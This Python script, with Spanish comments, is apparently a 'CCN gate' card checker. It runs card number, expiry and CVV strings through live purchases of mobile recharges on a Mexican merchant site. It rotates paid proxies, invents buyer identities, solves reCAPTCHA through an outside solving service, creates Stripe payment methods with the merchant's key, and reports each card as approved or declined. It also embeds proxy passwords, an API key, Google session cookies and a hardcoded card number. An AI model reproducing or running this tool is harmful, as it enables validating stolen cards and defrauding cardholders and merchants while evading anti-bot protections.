import ast
import email
from email import message
from tarfile import data_filter
import random, time
import token
from faker import Faker
from random import choice
from tkinter import LAST, Tk, filedialog
from httpx import TooManyRedirects, request
import requests,re
from bs4 import BeautifulSoup as b
from bs4 import BeautifulSoup
#from hh import keep_alive
import requests
import json, string, re
import requests
import time
import json
import random, time
from faker import Faker
from random import choice
import asyncio
import requests
from bs4 import BeautifulSoup
import requests
import re
from bs4 import BeautifulSoup as b
from curl_cffi import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import json
import cloudscraper


def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None

def get_random_proxy(file_path="proxys.txt"):
    with open(file_path, "r") as f:
        proxies = f.readlines()
    
    proxy = random.choice(proxies).strip()  # Elegir un proxy aleatorio
    host_port, user_pass = proxy.split("@")  # Separar IP y usuario:contraseña
    host, port = host_port.split(":")  # Separar IP y puerto
    user, password = user_pass.split(":")  # Separar usuario y contraseña
    
    return host, port, user, password
async def resolver_captcha(api_key, sitekey, url):
    data = {
        'clientKey': api_key,
        'task': {
            'type': 'NoCaptchaTaskProxyless',
            'websiteURL': url,
            'websiteKey': sitekey
        }
    }
    try:
        response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/createTask', json=data)
        result = response.json()

        if 'errorId' in result and result['errorId'] == 0:
            task_id = result['taskId']
            
            # Esperar a que se resuelva el captcha
            while True:
                await asyncio.sleep(5)
                response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/getTaskResult', json={'clientKey': api_key, 'taskId': task_id})
                if response.json()['status'] == 'ready':
                    return response.json()['solution']['gRecaptchaResponse']
        else:
            raise Exception('Error en la API de anti-captcha')

    except Exception as e:
        raise Exception(f'Error al resolver el captcha: {str(e)}')
    
def generar_numero_usa():
    area_code = random.randint(200, 999)  # NXX (sin incluir 0 o 1 como primer dígito)
    central_office_code = random.randint(200, 999)  # NXX (sin incluir 0 o 1 como primer dígito)
    line_number = random.randint(1000, 9999)  # XXXX
    
    return f"({area_code})-{central_office_code}-{line_number}"

def print_all_texts(data):
    if isinstance(data, dict):
        # Si existe una clave 'value' que contiene una lista
        if "value" in data and isinstance(data["value"], list):
            for value_item in data["value"]:
                if isinstance(value_item, dict) and "text" in value_item:
                    print(value_item["text"])
        # Continuar buscando en otros niveles
        for key, value in data.items():
            print_all_texts(value)

    elif isinstance(data, list):
        for item in data:
            print_all_texts(item)


def ccn_gate(card):
    max_retries = 15
    retry_count = 0
    while retry_count < max_retries:
        try:
            #============[Funcions Need]============#
            c =  requests.Session()
            c.proxies = {'https': 'http://ubcff417d571a05cf-zone-custom-region-us-st-newyork-city-yonkers-session-OKEZNXIYE-sessTime-5:ubcff417d571a05cf@170.106.118.114:2334'}#the proxies?http://ubcff417d571a05cf-zone-custom-region-us-st-newyork-city-yonkers-session-OKEZNXIYE-sessTime-5:ubcff417d571a05cf@170.106.118.114:2334
            

            # Definir las credenciales del proxy y la URL
            proxy_url = 'http://proxy.soax.com:5000'
            proxy_user = 'package-265377-country-mx'
            proxy_pass = '589UEf1c4AXLjJ2M'

            # Configurar el proxy con autenticación
            #c.proxies = {
            #    'http': f'http://{proxy_user}:{proxy_pass}@proxy.soax.com:5000',
             #   'https': f'http://{proxy_user}:{proxy_pass}@proxy.soax.com:5000'
            #}

            # Desactivar la verificación SSL (equivalente al -k de curl)
            #c.verify = False

            # Permitir redirecciones (equivalente al -L de curl)
            #c.max_redirects = 10
            
            
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
            agente_user = UserAgent()
            proxy_host, proxy_port, proxy_user, proxy_pass = get_random_proxy()
            proxy = "geo.iproyal.com:12321"  # SIN "http://"
            proxy_auth = "rTPt8eauWJNOjdno:BUo3nBhOfK3TV3vt_country-us"

            proxys={"server": f"http://{proxy_host}:{proxy_port}"}

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']
           

            #============[Requests 1]============#
            
            time.sleep(2)
            sufijo = ''.join(str(random.randint(0, 9)) for _ in range(3))

            headers = {
                'authority': 'apitae.axiosmobile.mx',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'origin': 'https://axiosmobile.mx',
                'pragma': 'no-cache',
                'referer': 'https://axiosmobile.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            response = c.get('https://apitae.axiosmobile.mx/v1/altan/imei/353495111910597', headers=headers)

            headers = {
                'authority': 'apitae.axiosmobile.mx',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'origin': 'https://axiosmobile.mx',
                'pragma': 'no-cache',
                'referer': 'https://axiosmobile.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            response = c.get('https://apitae.axiosmobile.mx/v1/market-config', headers=headers)

            headers = {
                'authority': 'apitae.axiosmobile.mx',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                'origin': 'https://axiosmobile.mx',
                'pragma': 'no-cache',
                'referer': 'https://axiosmobile.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            json_data = {
                'products': [
                    {
                        'id': '636ec67a7ea143001d12682b',
                        'qty': 1,
                        'recharges': [
                            {
                                'carrierCode': '204',
                                'amount': 70,
                                'qty': 1,
                            },
                        ],
                    },
                ],
            }

            response = c.post('https://apitae.axiosmobile.mx/v1/market-purchases/landing/validate', headers=headers, json=json_data)

            responsePm = json.loads(response.text)
           

            API_KEY = "cac59a01c519254119599acd1084d7c4"  # 🔴 Reemplázala con tu clave de Anti-Captcha
            SITE_KEY = "6Lc6zV0qAAAAAFiRQJsfSOdAma47Ro4fpMIlZvgK"  # 🔹 Sitekey de reCAPTCHA
            URL_OBJETIVO = "https://axiosmobile.mx/pagos/envios?deliveryFee=0"  # 🔹 Página con el reCAPTCHA

            # 1. Enviar solicitud a Anti-Captcha para resolver el reCAPTCHA
            response = requests.post("https://api.anti-captcha.com/createTask", json={
                "clientKey": API_KEY,
                "task": {
                    "type": "RecaptchaV2TaskProxyless",  # Método para reCAPTCHA V2 (invisible)
                    "websiteURL": URL_OBJETIVO,
                    "websiteKey": SITE_KEY
                }
            })

            result = response.json()
            if result.get("errorId") != 0:
                print(f"❌ Error al enviar captcha: {result}")
                exit()

            task_id = result["taskId"]
            print(f"✅ Captcha enviado. ID: {task_id}")

            # 2. Esperar que Anti-Captcha resuelva el captcha
            for _ in range(15):  # Máximo 75 segundos (15 intentos de 5 seg)
                time.sleep(5)
                respuesta = requests.post("https://api.anti-captcha.com/getTaskResult", json={
                    "clientKey": API_KEY,
                    "taskId": task_id
                })

                resultado = respuesta.json()
                
                if resultado.get("status") == "ready":
                    token_captcha = resultado["solution"]["gRecaptchaResponse"]
                    print(f"✅ Captcha resuelto: ")
                    break
                print("⏳ Esperando resolución...")

            headers = {
                'authority': 'www.google.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/x-protobuffer',
                # 'cookie': '__Secure-3PAPISID=RpxSH8Er4vu9_-vw/A7hRrCp8qg6w0Hp6l; __Secure-3PSID=g.a000wwgaJQGIFqZyyZ8fiYmGtaN-k0ywdqQhPz_9vwPsa4s_tw3Oc9XEjsQVK6NIa5l6YdgJ4wACgYKAZsSARYSFQHGX2MiKRq0RsOj3dPcqPHWgWk39RoVAUF8yKqEi0gbPnBaTpKE02yaXaV-0076; NID=524=RcLYGbtYwrw8W6r7kICJFyY0g6n3CNFV1IYtP89pK1J6Lsbq5YmH8q7H1GFzBILDZXNVr8tsS3pcJeHdtFq5flDCRze8RoRE63FOk2nfCv0NKBOO5Xy8_s4hsmcOIf4QHfyU0x6aJE3kCrF7t8Uf7GV3QaRNKtppOXOvrZ03jcsALrXsjDo7CjEk474v668mVHfyZU9xBajiyKMvnWx3yi3tyN-iFip0nw5TuTOgeGNrSa2WO7mjYqZzbPikkbVGiaLWGsLPS4RL_aGRD0oE3cVmAvUhHTU2RSlpCAkbiXkxj7J5bwClh-tPXgyGmrCnS3kR5M-UjfeytdYCcM9pKwEFQd80LDXWE4dDz60tApNNx58Tib0hFrplDV-WKt8WxFw93tbBHp7697fOQ_Rl9BL0-yItKhv-kcUiCKepAeswvlqujVd4mVoeOBN5rg2OKmrfYkZN59aF6as6zNd6-EeTbs-Vq1VUpkZ7Tsqn-OJqnGExBnbGxaOQeNwbf938qHgPSnWWpKfkLrEl1B38tdeq7Cw-V84ctZxToMfkq_-d3h4o-Ih6kWEl-gkshjh_X5jO8BUkkc1Ri_JGph3cijbKVfbBngB6ad7Cs4vGIjMy9xqw9rfb0rguRnJ5aZtJd8od7CIsXA4V3k8rO6xpi6Ro0y16JMa-hF3-KYIMxl3vgfpnUOfXoZYcWw0dHjmjMQRfbH-8Z5rsnLyIaDR274kHBOzK9z0VYENGC6pGnK1lzm-Je3T3u1PWhbGH7537nRxicXLXZibTCNGYBdMwUfRQmQbJDOUdiSf0lNI1ghGrbQM0i3KhojFGqjuOsXX97Pi9NeuZNDDJvs6klDMzbb30OQAaAfA-9jw0nA6hAFGKcV-B_iHZWZNvtv1HXWuxC94PFSHS3Q-6-1pL_3e9sNO6ERzvXaQT8mU3y2HNnVzmP_fd4v-vrVCF0Alhiq2Y2KjhC7dmjI2AFyZyVAXSjN02nCAQ3ppyYOeKYCyCDMGunesvpN7MrjxAkPqtYGYaLrfIiw7xQ2mePwBdvk40Rnahy8GyseQwGfBv5-V7oyEURhUK718Uhkb7syiQPqaCcYxfCGU2neIjOXqYSBM_x_H4pyWua-uatsH0Vy3V-X1U_z6JvwX9AL_I22m3dZqaLBU5qqYkJF_AGHtYPCQP9GyV-G-0gogJYhYdqjeKU9x40Bswix89ZeSR5ZTz4D2FjYdXy6xeJh9PF_oWGj4g8Di4IHt98XTe_Qflt12cSdNvj_Mb_Kjy0yue596UVFHmSgg4JC58jMjOEdjukzeElwg2MqmO7pWkTJeGCrr1GvCrhEJL6xVliw15vk3UEMqxhLaWKytIo4cv2GecepNTEAAro6zpXQTJ-BLrgcKRxKMv__fjoKQkwfUMEHJBZr5s1zTJJ9HtV6Wks5ptRRLU5KevtWUx-JnyK4L6Sw; __Secure-3PSIDTS=sidts-CjIB5H03P1MYh1HJqnBgJ4OkfutldqQFM9zFreCQjwsi3jDbeJ6jDTPgE8HBbTxTJCOY3xAA; __Secure-3PSIDCC=AKEyXzWgpcLCzVFw38fdYRpz80KAB7kchxSkSpH-Yq31mMFRuKTLurq32l4912CVX0zHTsuotY8',
                'origin': 'https://www.google.com',
                'pragma': 'no-cache',
                'referer': 'https://www.google.com/recaptcha/api2/bframe?hl=es&v=GUGrl5YkSwqiWrzO3ShIKDlu&k=6Lc6zV0qAAAAAFiRQJsfSOdAma47Ro4fpMIlZvgK',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'x-client-data': 'CLuIywE=',
            }

            params = {
                'k': '6Lc6zV0qAAAAAFiRQJsfSOdAma47Ro4fpMIlZvgK',
            }

            data = b'\n\x18GUGrl5YkSwqiWrzO3ShIKDlu\x12' + token_captcha.encode('utf-8')

            response = c.post('https://www.google.com/recaptcha/api2/reload', params=params, headers=headers, data=data)
            

            headers = {
                'authority': 'www.google.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                # 'cookie': '__Secure-3PAPISID=RpxSH8Er4vu9_-vw/A7hRrCp8qg6w0Hp6l; __Secure-3PSID=g.a000wwgaJQGIFqZyyZ8fiYmGtaN-k0ywdqQhPz_9vwPsa4s_tw3Oc9XEjsQVK6NIa5l6YdgJ4wACgYKAZsSARYSFQHGX2MiKRq0RsOj3dPcqPHWgWk39RoVAUF8yKqEi0gbPnBaTpKE02yaXaV-0076; NID=524=RcLYGbtYwrw8W6r7kICJFyY0g6n3CNFV1IYtP89pK1J6Lsbq5YmH8q7H1GFzBILDZXNVr8tsS3pcJeHdtFq5flDCRze8RoRE63FOk2nfCv0NKBOO5Xy8_s4hsmcOIf4QHfyU0x6aJE3kCrF7t8Uf7GV3QaRNKtppOXOvrZ03jcsALrXsjDo7CjEk474v668mVHfyZU9xBajiyKMvnWx3yi3tyN-iFip0nw5TuTOgeGNrSa2WO7mjYqZzbPikkbVGiaLWGsLPS4RL_aGRD0oE3cVmAvUhHTU2RSlpCAkbiXkxj7J5bwClh-tPXgyGmrCnS3kR5M-UjfeytdYCcM9pKwEFQd80LDXWE4dDz60tApNNx58Tib0hFrplDV-WKt8WxFw93tbBHp7697fOQ_Rl9BL0-yItKhv-kcUiCKepAeswvlqujVd4mVoeOBN5rg2OKmrfYkZN59aF6as6zNd6-EeTbs-Vq1VUpkZ7Tsqn-OJqnGExBnbGxaOQeNwbf938qHgPSnWWpKfkLrEl1B38tdeq7Cw-V84ctZxToMfkq_-d3h4o-Ih6kWEl-gkshjh_X5jO8BUkkc1Ri_JGph3cijbKVfbBngB6ad7Cs4vGIjMy9xqw9rfb0rguRnJ5aZtJd8od7CIsXA4V3k8rO6xpi6Ro0y16JMa-hF3-KYIMxl3vgfpnUOfXoZYcWw0dHjmjMQRfbH-8Z5rsnLyIaDR274kHBOzK9z0VYENGC6pGnK1lzm-Je3T3u1PWhbGH7537nRxicXLXZibTCNGYBdMwUfRQmQbJDOUdiSf0lNI1ghGrbQM0i3KhojFGqjuOsXX97Pi9NeuZNDDJvs6klDMzbb30OQAaAfA-9jw0nA6hAFGKcV-B_iHZWZNvtv1HXWuxC94PFSHS3Q-6-1pL_3e9sNO6ERzvXaQT8mU3y2HNnVzmP_fd4v-vrVCF0Alhiq2Y2KjhC7dmjI2AFyZyVAXSjN02nCAQ3ppyYOeKYCyCDMGunesvpN7MrjxAkPqtYGYaLrfIiw7xQ2mePwBdvk40Rnahy8GyseQwGfBv5-V7oyEURhUK718Uhkb7syiQPqaCcYxfCGU2neIjOXqYSBM_x_H4pyWua-uatsH0Vy3V-X1U_z6JvwX9AL_I22m3dZqaLBU5qqYkJF_AGHtYPCQP9GyV-G-0gogJYhYdqjeKU9x40Bswix89ZeSR5ZTz4D2FjYdXy6xeJh9PF_oWGj4g8Di4IHt98XTe_Qflt12cSdNvj_Mb_Kjy0yue596UVFHmSgg4JC58jMjOEdjukzeElwg2MqmO7pWkTJeGCrr1GvCrhEJL6xVliw15vk3UEMqxhLaWKytIo4cv2GecepNTEAAro6zpXQTJ-BLrgcKRxKMv__fjoKQkwfUMEHJBZr5s1zTJJ9HtV6Wks5ptRRLU5KevtWUx-JnyK4L6Sw; __Secure-3PSIDTS=sidts-CjIB5H03P1MYh1HJqnBgJ4OkfutldqQFM9zFreCQjwsi3jDbeJ6jDTPgE8HBbTxTJCOY3xAA; __Secure-3PSIDCC=AKEyXzW0hGtukZIdNn6ovx6giLXZ1bELMzv6_VHHKN0nBfnu_D36h8Icy1cgdQVe9vGrUn0uKaM',
                'origin': 'https://www.google.com',
                'pragma': 'no-cache',
                'referer': 'https://www.google.com/recaptcha/api2/bframe?hl=es&v=GUGrl5YkSwqiWrzO3ShIKDlu&k=6Lc6zV0qAAAAAFiRQJsfSOdAma47Ro4fpMIlZvgK',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'x-client-data': 'CLuIywE=',
            }

            params = {
                'k': '6Lc6zV0qAAAAAFiRQJsfSOdAma47Ro4fpMIlZvgK',
            }

            data = f'v=GUGrl5YkSwqiWrzO3ShIKDlu&c={token_captcha}'

            response = c.post(
                'https://www.google.com/recaptcha/api2/userverify',
                params=params,
                
                headers=headers,
                data=data,
            )

            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'pragma': 'no-cache',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                            '(KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            data = {
                'type': 'card',
                'billing_details[name]': name+last,
                'card[number]': cc_number,
                'card[cvc]': cvv,
                'card[exp_month]': mes,
                'card[exp_year]': ano_number,
                'guid': '2953e2d9-6a1c-4c42-a83e-28bb4e237f8577fee5',
                'muid': 'a1b9ce10-8f82-41e6-b045-c0be20a805c9a60811',
                'sid': '273ad5b3-d0bc-4d2d-b555-65806fe84528669f30',
                'pasted_fields': 'number',
                'payment_user_agent': 'stripe.js/c0b5539ba7; stripe-js-v3/c0b5539ba7; split-card-element',
                'referrer': 'https://axiosmobile.mx',
                'time_on_page': '635838',
                'key': 'pk_live_51R2fReGAHd6L6ncYTxudPM0JdKtyWAJah2zLf1wg9lO9cx5kkPqXvSe23Ddtcom0jKTVRy1eBEdCgYc50wS8HQAm00jeCMRf49',
                '_stripe_version': '2025-01-27.acacia',
                'radar_options[hcaptcha_token]': 'P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9... (truncado por legibilidad)'
            }

            response = c.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=headers,
                data=data
            )
            responsePm = json.loads(response.text)
            tokenst = responsePm['id']
            print(tokenst)

            headers = {
                'authority': 'apitae.axiosmobile.mx',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                'origin': 'https://axiosmobile.mx',
                'pragma': 'no-cache',
                'referer': 'https://axiosmobile.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            json_data = {
                'products': [
                    {
                        'id': '636ec67a7ea143001d12682b',
                        'qty': 1,
                        'recharges': [
                            {
                                'carrierCode': '204',
                                'amount': 70,
                                'qty': 1,
                            },
                        ],
                    },
                ],
                'deliveryAddress': {
                    'email': 'rodrigoking234@gmail.com',
                    'name': name+last,
                    'phone': '9971556'+str(sufijo),
                    'street': '',
                    'exteriorNumber': '',
                    'neighborhood': '',
                    'cp': '',
                    'city': '',
                    'state': '',
                    'references': '',
                },
                'stripePaymentMethodId': tokenst,
                'reference': None,
            }

            response = c.post('https://apitae.axiosmobile.mx/v1/market-purchases/landing', headers=headers, json=json_data)
            time.sleep(2)
            responsePm = json.loads(response.text)
            print(responsePm)
            

            mensaje = ""

            # Verificar si hay un error tipo 'card_declined'
            if 'message' in responsePm and 'error' in responsePm['message']:
                error_info = responsePm['message']['error']
                if error_info.get('code') == 'card_declined':
                    mensaje = f"❌ Tarjeta rechazada: {error_info.get('message', 'Error desconocido')}"
                else:
                    mensaje = f"⚠️ Otro error: {error_info.get('message', 'Error desconocido')}"

            # Verificar si está aprobado por status 'delivered' o 'authorized'
            elif 'altan_service_bundle_order' in responsePm:
                status = responsePm['altan_service_bundle_order'].get('status', '').lower()
                if status in ['delivered', 'authorized']:
                    mensaje = "✅ Aprobado"
                else:
                    mensaje = f"🔄 Estado: {status}"

            # Verificar si existe 'created_at' en payment_card
            elif 'payment_card' in responsePm and 'created_at' in responsePm['payment_card']:
                fecha = responsePm['payment_card']['created_at']
                mensaje = f"✅ Aprobado (Tarjeta registrada correctamente)\n🕒 Fecha de creación: {fecha}"

            # En caso de que no sea ninguno de los anteriores
            else:
                mensaje = f"❓ Respuesta no reconocida: {responsePm}"

            return mensaje

            

            
                                    
            


            
           

          

                    
           
            

        
            
        except Exception as e:
            print(e)
            retry_count += 1
    else:
        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
    

if __name__ == "__main__":
    print(ccn_gate("5456080071103691|04|2028|524"))